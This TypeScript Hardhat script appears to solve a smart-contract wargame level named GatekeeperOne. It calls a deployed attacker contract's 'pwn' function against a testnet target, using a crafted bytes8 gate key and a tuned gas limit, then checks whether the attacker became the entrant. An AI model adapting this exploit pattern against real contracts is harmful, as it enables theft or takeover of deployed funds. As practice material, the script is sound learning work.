import { ethers } from "hardhat"

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x09d96fF15D393A68Ac7E31cCA12dC8b8adb617ec"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "bytes8",
          name: "_gateKey",
          type: "bytes8",
        },
      ],
      name: "enter",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x3370204e",
    },
    {
      inputs: [],
      name: "entrant",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x9db31d77",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("GatekeeperOne")
  const gateKey = "0x100000000000efb3"
  const tx = await contract.pwn(targetAddress, gateKey, { gasLimit: 109055 })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://rinkeby.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log(`Entrant ${await target.entrant()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
